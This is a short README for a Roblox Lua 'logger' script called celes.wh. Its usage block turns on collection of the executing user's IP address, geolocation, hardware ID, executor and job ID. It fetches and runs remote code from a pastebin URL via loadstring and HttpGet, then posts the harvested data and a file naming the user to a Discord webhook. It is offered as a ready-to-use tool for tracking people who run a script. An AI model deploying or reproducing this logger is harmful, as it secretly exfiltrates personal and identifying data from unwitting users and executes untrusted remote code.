# celes.wh
## Usage
```lua
_G.IgnoreLoggedCheck = false
_G.IgnoreCooldown = false
_G.WebhookCooldown = 60 -- seconds
_G.IpLog = true
_G.GeoLog = true
_G.HwidLog = true
_G.ExecutorLog = true
_G.JobIdLog = true
_G.PingEveryone = true
_G.EmbedTitle = "💀 Celesth Logger Alert"
_G.EmbedMessage = "Script executed by someone."
_G.EmbedColor = 65280
_G.EmbedThumbnail = "https://www.roblox.com/headshot-thumbnail/image?userId="..game.Players.LocalPlayer.UserId.."&width=150&height=150&format=png"

local Celesth = loadstring(game:HttpGet("https://pastebin.com/raw/YOUR_LOGGER"))()
local webhook = "https://discord.com/api/webhooks/..."

-- Send embed
Celesth:Log(webhook)

-- Send optional file
Celesth:SendFile(webhook, "user.txt", "Executed by " .. game.Players.LocalPlayer.Name, "📎 File log")
```
